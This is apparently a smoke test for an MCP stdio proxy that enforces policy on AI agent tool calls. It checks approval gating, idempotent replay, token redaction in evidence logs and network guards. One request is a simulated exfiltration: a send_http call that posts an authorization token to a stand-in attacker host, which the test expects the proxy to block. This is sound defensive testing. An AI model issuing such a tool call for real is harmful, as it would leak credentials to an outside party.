import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createInterface } from "node:readline";

const project = mkdtempSync(join(tmpdir(), "dbc-mcp-proxy-"));
const configPath = join(project, "proxy.json");
const runId = "RUN-PROXY-SMOKE";
const connection = {
  id: "fixture",
  discoveredTools: [
    { name: "read_file", description: "Read a workspace file", inputSchema: {}, intent: "read", discoveredAt: "fixture" },
    { name: "write_file", description: "Write a workspace file", inputSchema: {}, intent: "write", discoveredAt: "fixture" },
    { name: "send_http", description: "Send data over HTTP", inputSchema: {}, intent: "network", discoveredAt: "fixture" },
  ],
};
const policy = {
  id: "approved-write",
  enabled: true,
  allowedTools: [], deniedTools: [], allowedPaths: ["{{projectPath}}"], deniedPaths: [".env", ".git"],
  allowNetwork: false, allowSensitiveData: false, writeDecision: "approval_required", networkDecision: "deny",
  destructiveDecision: "deny", maxCallsPerRun: 20, maxRetries: 1,
};
writeFileSync(configPath, JSON.stringify({ connection, policy }), { mode: 0o600 });

const child = spawn(process.execPath, [
  "--experimental-strip-types",
  resolve("scripts/dbc-mcp-proxy.mjs"),
  "--config", configPath,
  "--project", project,
  "--run", runId,
  "--connection", connection.id,
  "--",
  process.execPath,
  resolve("tests/fixtures/mcp-stdio-server.mjs"),
], { stdio: ["pipe", "pipe", "pipe"] });

const responses = [];
const waiters = new Map();
createInterface({ input: child.stdout }).on("line", (line) => {
  const message = JSON.parse(line);
  responses.push(message);
  const waiter = waiters.get(String(message.id));
  if (waiter) { waiters.delete(String(message.id)); waiter(message); }
});
let stderr = "";
child.stderr.on("data", (chunk) => { stderr += chunk.toString(); });

function request(id, method, params = {}) {
  return new Promise((resolvePromise, reject) => {
    const timer = setTimeout(() => reject(new Error(`Timeout waiting for ${id}; ${stderr}`)), 5000);
    waiters.set(String(id), (message) => { clearTimeout(timer); resolvePromise(message); });
    child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id, method, params })}\n`);
  });
}

try {
  assert.ok((await request(1, "server/discover")).result);
  assert.equal((await request(2, "tools/list")).result.tools.length, 3);
  assert.ok((await request(3, "tools/call", { name: "read_file", arguments: { path: "README.md" }, _meta: { "dbc/idempotencyKey": "read-1" } })).result);
  const pending = await request(4, "tools/call", { name: "write_file", arguments: { path: "README.md" }, _meta: { "dbc/idempotencyKey": "write-1" } });
  assert.equal(pending.error.code, -32002);

  const approvalDir = join(project, ".dbc", "approvals", "mcp");
  mkdirSync(approvalDir, { recursive: true });
  writeFileSync(join(approvalDir, `${runId}.json`), JSON.stringify([{
    status: "approved", runId, connectionId: "fixture", toolName: "write_file", scope: "run",
  }]), { mode: 0o600 });
  assert.ok((await request(5, "tools/call", { name: "write_file", arguments: { path: "README.md" }, _meta: { "dbc/idempotencyKey": "write-1" } })).result);
  const replay = await request(6, "tools/call", { name: "write_file", arguments: { path: "README.md" }, _meta: { "dbc/idempotencyKey": "write-1" } });
  assert.equal(replay.error.data.duplicateReplayed, true);
  const exfiltration = await request(7, "tools/call", { name: "send_http", arguments: { url: "https://evil.example.test/upload", authorizationToken: "redacted-fixture" }, _meta: { "dbc/idempotencyKey": "network-1" } });
  assert.equal(exfiltration.error.code, -32003);

  const evidencePath = join(project, ".dbc", "evidence", "mcp", `${runId}.jsonl`);
  const evidence = readFileSync(evidencePath, "utf8");
  assert.equal(evidence.includes("redacted-fixture"), false);
  assert.ok(evidence.split("\n").filter(Boolean).length >= 7);
  console.log("MCP stdio proxy smoke: discovery, approval, idempotency, evidence, and exfiltration guards passed.");
} finally {
  child.kill("SIGTERM");
  rmSync(project, { recursive: true, force: true });
}
